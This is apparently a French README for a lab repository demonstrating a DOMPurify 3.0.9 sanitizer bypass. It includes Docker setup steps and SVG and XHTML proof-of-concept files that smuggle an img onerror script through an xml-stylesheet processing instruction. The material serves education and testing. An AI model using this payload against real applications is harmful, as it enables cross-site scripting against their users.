# Dompurify 3.0.9 bypass - Node type confusion

## Lien vers l'article complet

> Un article reprenant le travail de slonser concernant le bypass de Dompurify dans sa version 3.0.9.

[https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.9-bypass-node-type-confusion](https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.9-bypass-node-type-confusion)

## Installation

```
docker build -t dompurify-3.0.9-bypass .
docker run -p 3000:3000 --name dompurify-3.0.9-bypass dompurify-3.0.9-bypass
```

![image](https://github.com/Sharpforce/cybersecurity-code/assets/6013418/75be9d65-91ce-4fc4-b561-9c6be3699627)

## Description

L'application permet de téléverser des fichiers au format HTML, SVG ou XHTML, mais la consultation de ces fichiers, bien que possible, est restreinte par une politique CSP. L'inclusion d'un tel fichier, assainie par Dompurify, au sein de la page principale, permet toutefois l'exploitation du bypass et l'exécution de code Javascript.

## Exploitation

### Fichier HTML

La vulnérabilité est exploitable seulement lorsque le noeud est de type XML. L'inclusion d'un fichier HTML permet de confirmer le bon assainissement de la part de Dompurify lorsque le noeud est de type HTML.

### Fichier SVG

Le fichier SVG suivant permet l'exploitation du bypass :
```SVG
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
  <rect width="50" height="50" fill="green" />
  <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
</svg>
```

### Fichier XHTML

Le fichier XHTML suivant permet l'exploitation du bypass :
```HTML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Exemple de document XHTML</title>
</head>
<body>
    <h1>Document XHTML</h1>
    <p>Exploitation de Dompurify 3.0.9.</p>
    <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
</body>
</html>
```

## Démo

![](https://github.com/Sharpforce/cybersecurity-code/blob/main/dompurify-3.0.9-bypass-node-type-confusion/demo/demo.gif)

## Disclaimer

Cet outil est destiné uniquement à des fins éducatives et doit être utilisé uniquement dans des environnements de tests de pénétration autorisés. L'accès ou l'utilisation non autorisés de systèmes que vous ne possédez pas est illégal. L'auteur n'est pas responsable de toute utilisation abusive de cet outil.

## License

Ce projet est sous licence MIT.